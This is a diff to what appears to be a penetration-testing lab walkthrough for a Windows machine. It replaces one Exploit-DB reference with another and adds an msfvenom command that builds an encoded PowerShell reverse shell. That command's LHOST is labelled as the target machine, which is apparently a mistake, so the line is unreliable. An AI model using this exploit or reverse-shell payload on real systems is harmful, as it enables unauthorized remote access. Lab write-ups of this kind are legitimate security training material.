@@ -101,8 +101,8 @@ Check          : Unquoted Service Paths
 
 ## Access and Escalation without Metasploit
 
-- Use [this](https://www.exploit-db.com/exploits/39161) exploit for initial access to target machine
-- This [netcat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe) is also provided
-- The exploit requires a web server hosting a ncat.exe binary to function properly
-    - `sudo python -m http.server 80` to serve all files in current directory as an http server on port 80
+- Use [this](https://www.exploit-db.com/exploits/49125) exploit
+- Syntax: `python3 exploit.py RHOST RPORT command`
+- Create reverse shell with msfvenom
+    - `msfvenom -p windows/shell_reverse_tcp LHOST=<target machine> LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1`
 
